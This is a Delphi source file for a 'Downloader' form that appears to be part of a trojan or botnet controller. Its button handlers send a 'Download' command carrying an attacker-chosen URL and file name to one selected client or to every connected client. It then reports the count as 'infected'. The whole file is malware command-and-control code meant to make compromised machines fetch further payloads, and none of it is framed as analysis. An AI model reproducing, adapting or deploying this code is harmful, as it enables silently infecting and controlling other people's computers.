unit uDownloader;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ComCtrls, Buttons, PngBitBtn;

type
  TFrmDownloader = class(TForm)
    PageControl1: TPageControl;
    GroupBox1: TGroupBox;
    edtAddr: TEdit;
    Label1: TLabel;
    edtFileName: TEdit;
    btnAllDownload: TPngBitBtn;
    btnDownload: TPngBitBtn;
    procedure btnAllDownloadClick(Sender: TObject);
    procedure btnDownloadClick(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  FrmDownloader: TFrmDownloader;

implementation

uses uGeneral;

{$R *.dfm}

procedure TFrmDownloader.btnAllDownloadClick(Sender: TObject);
var
  i :Integer;
begin
  for i := 0 to (FrmGeneral.ListUsers.Items.Count-1) do
  begin
    FrmGeneral.Server.Socket.Connections[i].SendText('Download|'+edtAddr.Text+'|'+edtFileName.Text);
  end;
  MessageBoxA(0, PChar(IntToStr(FrmGeneral.ListUsers.Items.Count)+' infected!'), 'Information', 64);
end;

procedure TFrmDownloader.btnDownloadClick(Sender: TObject);
begin
  if (FrmGeneral.ListUsers.Selected <> nil) then
  begin
    FrmGeneral.Server.Socket.Connections[FrmGeneral.ListUsers.Selected.Index].SendText('Download|'+edtAddr.Text+'|'+edtFileName.Text);
    MessageBoxA(0, PChar('1 infected!'), 'Information', 64);
  end else MessageBoxA(0, 'Select a user!', 'Information', 64);
end;

end.
